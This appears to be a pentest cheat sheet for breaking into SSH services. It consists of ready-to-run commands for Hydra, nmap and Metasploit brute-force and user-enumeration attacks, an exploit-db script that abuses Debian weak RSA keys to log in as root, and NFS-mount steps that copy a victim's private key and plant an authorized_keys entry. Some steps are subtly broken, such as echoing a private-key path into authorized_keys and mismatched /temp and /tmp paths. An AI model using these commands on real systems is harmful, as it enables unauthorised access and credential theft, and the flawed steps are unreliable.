### Connect string:
nc ip 22

nc -vn <IP> 22

ssh-keyscan -t rsa <IP> -p <PORT>

hydra -L userlist.txt -P top-500.txt TARGETIP ssh

Login ssh -l name TARGETIP

### metasploit modules
msf> use scanner/ssh/ssh_identify_pubkeys

ssh_config

sshd_config

authorized_keys

ssh_known_hosts

known_hosts

id_rsa

msf> use scanner/ssh/ssh_enumusers

#Here you shoud have some users, e.g. msfadmin, msfadmin

msf > use auxiliary/scanner/ssh/ssh_login

msf auxiliary (scanner/ssh/ssh_login) > set rhosts 192.168.1.103

msf auxiliary (scanner/ssh/ssh_login) > set user_file /root/Desktop/user.txt

msf auxiliary (scanner/ssh/ssh_login) > set pass_file /root/Desktop/pass.txt

msf auxiliary (scanner/ssh/ssh_login) > exploit

### nmap commands
https://nmap.org/nsedoc/scripts/ssh-publickey-acceptance.html

nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<username>" <target>

nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst \ --script-args ssh-brute.timeout=4s <target>

### RSA method
Bruteforce Port 22 SSH (RSA Method)
This time we will brute-force the SSH service using a 5720.py. exploit. The exploit comes with RSA keys that it used to bruteforce the root login. We will basically be running the exploit by giving it the path to the RSA keys we want to use and the IP of the target machine. Hereâ€™s how it works.

python 5720.py /etc/opt/exploitdb-bin-sploits/bin-sploits/rsa/2048/ 172.16.80.27 root

ssh -l root -p22 -i /etc/opt/exploitdb-bin-sploits/bin-sploits/rsa/2048//c551f0a5d2f76d88b58b3ae90ceb617a-22002 172.16.80.27 root

tar jxf 5622.tar.bz2

/usr/share/exploitdb/exploits/linux/remote/5720.py

### obtaining KEY via rpc
#service rpcbind start

#mkdir /tmp/target

#mount -t nfs 10.0.0.27:/ /temp/target

#cp /tmp/target/home/msfadmin/.ssh/id_rsa /tmp/r00tprivatekey

#umount /tmp/target

### panting SSH Keys
#service rpcbind start

#mkdir /tmp/target

#mount -t nfs 10.0.0.27:/ /temp/target

#cd /tmp/target/home/msfadmin/ && mkdir .ssh/

#echo ~/.ssh/id_rsa >> /tmp/target/home/msfadmin/.ssh/authorized_keys

#umount /tmp/target

### Metasploit
msf auxiliary(ssh_login_pubkey) > set KEY_FILE /tmp/r00tprivatekey

KEY_FILE => /tmp/id_rsa

msf auxiliary(ssh_login_pubkey) > set USERNAME root

USERNAME => root

msf auxiliary(ssh_login_pubkey) > set RHOSTS 10.0.0.27

RHOSTS => 10.0.0.27

msf auxiliary(ssh_login_pubkey) >

### OpenSSH 4.7p1 Debian 8ubuntu1 is vulnerable to Bruteforce.
ssh -l root -p22 -i rsa/2048//c551f0a5d2f76d88b58b3ae90ceb617a-22002 172.16.80.27
